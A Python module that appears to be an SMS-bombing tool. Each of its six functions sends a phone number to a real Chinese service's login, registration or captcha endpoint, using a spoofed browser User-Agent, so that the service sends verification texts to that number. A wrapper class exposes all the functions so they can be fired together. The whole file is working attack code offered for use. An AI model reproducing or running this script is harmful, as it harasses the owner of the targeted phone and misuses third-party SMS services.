import sys
import time
import types
import random
import requests

ua = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; rv:40.0) Gecko/20100101 Firefox/40.1'
}


def dicos(phone_number):
    payload = {
        'name': phone_number,
        'gw_id': 3011033,
        'gw_address': 1,
        'gw_port': 1,
        'url': 1,
        'need_user_login': 1,
        'submit_type': 'getpwd',
        'type': 2,
        'isui2': 5,
    }
    url = 'http://adpage.dicos.com.cn/cmps/admin.php/api/%s'

    session = requests.Session()
    session.get(url % 'login/', params=payload, headers=ua)
    session.post(url % 'loginaction', data=payload, headers=ua)


def appchina(phone_number):
    guid = 'bb9bca15-6bed-47eb-b3e6-3a9691a4ef66'
    payload = {
        'api': 'market.MarketAPI',
        'deviceId': '%32x' % random.getrandbits(128),
        'param':
            '{"guid":"%s","login":"%d","type":"account.getCaptcha",'
            '"captcha_type":"phone","nickname":"nrjnx","apiVer":12}}'
            % (guid, phone_number),
        'referer': guid
    }
    url = 'http://mobile.appchina.com/market/api'

    requests.post(url, data=payload, headers=ua)


def go189(phone_number):
    payload = {
        'callback': 'h5JsonpCallbck',
        '_': str(int(time.time() * 1000)),
        'para':
            '"accNbr=%d;'
            'pubAreaCode=025;'
            'pushUserId=jszt_4600045;'
            'ztInterSource=1000000"'
            % phone_number
    }
    url = 'http://wx.go189.cn/wxyyt_1/wxFlowBonus/getAuthCode.do'

    requests.get(url, params=payload, headers=ua)


def yuu1(phone_number):
    payload = {
        'username': phone_number,
        'op': 'send'
    }
    url = 'http://www.yuu1.com/app_api/reg_yuu1'

    requests.post(url, data=payload, headers=ua)


def ddzhuan(phone_number):
    payload = {
        'mobiles': phone_number
    }
    url = 'http://ptservicev2.ddzhuan.cn:8080/PTSERVICEV2/t/phcode'

    requests.post(url, data=payload, headers=ua)


def renzhenzhuan(phone_number):
    payload = {
        'phone': phone_number
    }
    url = 'http://www.renzhenzhuan.com/integral_admin/api/newuser/getPhoneCode.do'

    requests.post(url, data=payload, headers=ua)


class Wrapper(dict):
    def __init__(self, *args, **kwargs):
        super(*args, **kwargs)
        g = globals()
        self.update({
            k: g[k] for k in g
            if isinstance(g[k], types.FunctionType)
        })

    def __getattr__(self, key):
        return self[key] if key in self else self.__getattribute__(key)

Wrapper.__name__ = __name__
sys.modules[__name__] = Wrapper()
